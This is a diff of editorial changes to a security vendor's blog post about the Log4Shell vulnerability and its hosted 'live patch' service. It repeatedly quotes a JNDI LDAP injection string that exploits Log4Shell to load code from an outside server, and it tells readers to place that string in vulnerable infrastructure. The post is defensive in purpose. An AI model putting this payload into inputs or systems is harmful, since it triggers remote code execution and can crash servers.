@@ -36,19 +36,19 @@ ${jndi:ldap://patch.log4shell.com:1389/a}
 _If you're looking for resources on how to detect and patch yourself against Log4Shell, please also read our in-depth
 [Mitigation Guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide)._
 
-## Why Log4Shell is an especially painful vulnerability
+## Why Log4Shell is an Especially Painful Vulnerability
 
 Mitigating a vulnerability in a single dependency used by your project typically requires a lot of work:
 
-- Code must be written,
-- Tests must pass,
-- Changes must be approved,
-- It has to be deployed,
-- and, finally, it must be monitored.
+- Code must be written.
+- Tests must pass.
+- Changes must be approved.
+- It must be deployed.
+- And, finally, it must be monitored.
 
-A vulnerability in a logging framework, especially one as prolific as Log4j, is often not a single vulnerability in a
-single dependency though. Mitigating Log4Shell isn't just a matter of updating _your_ code, but it also requires
-updating all of your dependencies that are _also using_ Log4j.
+However, a vulnerability in a logging framework, especially one as prolific as `log4j`, is often not a single vulnerability in a
+single dependency. Mitigating Log4Shell isn't just a matter of updating _your_ code, but also requires
+updating all of your dependencies that are _also using_ `log4j`.
 
 Now repeat that 50+ times for every service you own. *Welcome to Log4Shell!*
 
@@ -56,33 +56,33 @@ Now repeat that 50+ times for every service you own. *Welcome to Log4Shell!*
 
 ## Living in Dependency Hell
 
-Simply, one might ask, "Why not just update the dependency to the latest version?"
+One might simply ask, "Why not just update the dependency to the latest version?"
 
 But updating all of your dependencies at once can be dangerous.
 
-- What if you're several versions behind and the Log4j fix isn't ported to your version?
+- What if you're several versions behind and the `log4j` fix isn't ported to your version?
 - What if changing that version causes your tests to not pass?
-- What if you don't have tests to check correctness of the change... does that mean your app is suddenly broken?
+- What if you don't have tests to check correctness of the change? Does that mean your app is suddenly broken?
 
 These questions are what often keep organizations from updating their dependencies in the first place. A vulnerability
-like Log4Shell forces you to not just patch the vulnerability in your code, but also deal with the (potentially years)
+like Log4Shell forces you to not just patch the vulnerability in your code, but also deal with the (potentially years),
 of tech debt that's attached to it.
 
-## Down the rabbit hole...
+## Down the Rabbit Hole...
 
-But your vendors are also using Log4j. If your vendor software is a black box that runs locally on-prem or remotely in the cloud,
+Your vendors are also using `log4j`. If your vendor software is a black box that runs locally on-prem or remotely in the cloud,
 there is no way to simply "update" it to the latest version. You have no access to their source code or their dependencies.
 
 You are left helpless until mitigation steps are given to you.
 
-With this current Log4j fiasco, we've seen some vendors have
-[recommended turning off their service](https://news.ycombinator.com/item?id=29562255)
+With this current `log4j` fiasco, we've seen some vendors 
+[recommend turning off their service](https://news.ycombinator.com/item?id=29562255)
 until they have mitigated Log4Shell themselves.
 
 Being left in the dark by a company you have paid to provide you a service isn't tolerable. Companies often depend deeply
 on the vendor's software for their own business. It's simply not possible to just "wait" until it's patched.
 
-## Stuck between worlds
+## Stuck Between Worlds
 
 All the while, while companies are panicked and struggling to hang on, attackers are getting more sophisticated with
 their payloads. They are bypassing WAFs, the first line of defense, with
@@ -95,36 +95,36 @@ The fallout from Log4Shell is going to take a _very_ long time to understand. We
 [barely even scratched the surface](https://arstechnica.com/information-technology/2021/12/as-log4shell-wreaks-havoc-payroll-service-reports-ransomware-attack/)
 of what the real impact to society is going to be.
 
-## A false sense of security
+## A False Sense of Security
 
-And, if you thought that was bad, I regret to inform you: That's not even the worst of the situation.
+If you thought that was bad, I regret to inform you that _it gets worse_.
 
-Even if you've managed to patch this, and your vendors have patched, it's still possible that
+Even if you've managed to patch the vulnerability, and your vendors have patched, it's still possible that
 [another vulnerability is discovered](https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046)
-that undoes the mitigation work you've already put in place, resetting the cycle.
+that undoes the mitigation work you've already put in place, thus resetting the cycle.
 
-Log4Shell is a pernicious bugger, indeed!
+Log4Shell is a pernicious bugger indeed!
 
-## An unconventional silver lining
+## An Unconventional Silver Lining
 
 If you find yourself stuck between a rock and a hard place for fixing this issue at your company, you might find
 yourself wishing for something better. Fortunately, the clever people of the internet have come up with a solution
 that may help you remedy this painful situation.
 
-By placing this string...
+By taking the string below:
 
 ```
 ${jndi:ldap://patch.log4shell.com:1389/a}
 ```
 
-...anywhere you can in your infrastructure that you're vulnerable to Log4Shell, you will be rolling out a temporary fix
+And placing it anywhere in your infrastructure that you're vulnerable to Log4Shell, you will be rolling out a temporary fix
 that gives you more time to patch.
 
 We run that server, but it's been built due to the work of [many](https://github.com/hillu/local-log4j-vuln-scanner/)
-smart [people](https://github.com/corretto/hotpatch-for-apache-log4j2) working on and dealing with the fallout
+smart [people](https://github.com/corretto/hotpatch-for-apache-log4j2) working on, and dealing with, the fallout
 from Log4Shell. We've just made it a little easier for you to use by hosting it for you.
 
-:::warning There be dragons!
+:::warning Here be dragons!
 
 This string will attempt to exploit the Log4Shell vulnerability and apply a patch to your live system. While this
 patch has been tested on a number of systems, your system might be different and could possibly crash. You have been warned.
@@ -132,11 +132,11 @@ patch has been tested on a number of systems, your system might be different and
 If it doesn't work for some reason, _your server will hang and possibly need a manual restart._
 :::
 
-## Running the Patch Code yourself
+## Running the Patch Code Yourself
 
 Since LunaSec is an Open Source company, we pride ourselves in being transparent in the work that we do.
 
-You can [run the patch server yourself](https://github.com/lunasec-io/lunasec/releases/) by downloading our `log4shell`
+You can [run the patch server yourself](https://github.com/lunasec-io/lunasec/releases/) by downloading our Log4shell
 CLI tool. And, if you're curious, you can review the full source code of this live patch service on
 [our repo](https://github.com/lunasec-io/lunasec/tree/master/tools/log4shell).
 
@@ -154,16 +154,16 @@ CLI tool. And, if you're curious, you can review the full source code of this li
         addr: 0.0.0.0:1389
 ```
 
-_(If you find this tool helpful, consider giving us a star, please! ;))_
+_(If you find this tool helpful, please consider giving us a Star on GitHub! ;))_
 
-## How does it work?
+## How Does It Work?
 
 This string will trigger the Log4Shell vulnerability and attempt to [exploit it](https://www.lunasec.io/docs/blog/log4j-zero-day/).
 Instead of your server being taken over by an attacker though, your server will actually be patched against further
 exploitation.
 
-While unorthodox, this is a very effective way to mitigate Log4j vulnerabilities, especially for any software you have no
-control over (like your vendors).
+While unorthodox, this is a very effective way to mitigate `log4j` vulnerabilities, especially for any software you have no
+control over (like that of your vendors).
 
 :::info
 We're also offering a paid, commercial service that will perform the same mitigation work for you, but is managed by us.
@@ -176,21 +176,21 @@ with us about it.
 
 We have extensively written about [steps for mitigating Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide),
 and we encourage you to refer to these steps as you work to address this vulnerability. We strongly urge you and
-your team to work towards updating your Log4j versions to ~~2.16.0~~ `2.17.0` as you are able to even if you've migrated to
-`2.15.0` or `2.16.0` already. (Update: log4j `2.16.0` has a DOS vulnerability with its own third security advisory.)
+your team to work towards updating your `log4j` versions to ~~`2.16.0`~~ `2.17.0`, as you are able to even if you've migrated to
+`2.15.0` or `2.16.0` already. (Update: `log4j` `2.16.0` has a DOS vulnerability with its own third security advisory.)
 
-If you do find yourself stuck in Dependency or Vendor hell though, you can always try to use the
-[Live Patch](#an-unconventional-silver-lining)
-or [contact us](https://www.lunasec.io/contact) about help you with a custom solution instead.
+If you do find yourself stuck in dependency or vendor hell though, you can always try to use the
+[Live Patch](#an-unconventional-silver-lining),
+or [contact us](https://www.lunasec.io/contact) about helping you with a custom solution instead.
 
 We're living in unusual times, and it's not crazy to try something new!
 
 ## Stay Updated
 
-Please follow us on [Twitter](https://twitter.com/LunaSecIO) or add yourself to our mailing list below, and we'll
+Please follow us on [Twitter](https://twitter.com/LunaSecIO), or add yourself to our mailing list below, and we'll
 update you when we publish new findings.
 
-And if this post helped you, please share it with others to help them too.
+If this post helped you, please share it with others to help them too.
 
 import ContactForm from '../src/components/ContactForm.jsx'
 
@@ -199,9 +199,9 @@ import ContactForm from '../src/components/ContactForm.jsx'
 ## More Information
 
 We have published a series of posts about Log4Shell on our blog that you might be interested in:
-- **[Part 2: Log4Shell Live Patch (Technical Deep-Dive)](https://www.lunasec.io/docs/blog/log4shell-live-patch-technical/)**,
-- **[Mitigation Guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/)**,
-- **[Original Log4Shell Announcement](https://www.lunasec.io/docs/blog/log4j-zero-day/)**,
+- **[Part 2: Log4Shell Live Patch (Technical Deep-Dive)](https://www.lunasec.io/docs/blog/log4shell-live-patch-technical/)**
+- **[Mitigation Guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/)**
+- **[Original Log4Shell Announcement](https://www.lunasec.io/docs/blog/log4j-zero-day/)**
 - **[Explanation of the 2nd Log4j CVE](https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046/)**
 
 ### Limited Offer: Free Security Assistance
@@ -220,4 +220,4 @@ If you would like to contribute, or notice any errors, this post is an Open Sour
 :::
 
 1. Added links to other blog posts.
-2. Updated info to reference new 2.17.0 DOS CVE
+2. Updated info to reference new 2.17.0 DOS CVE.
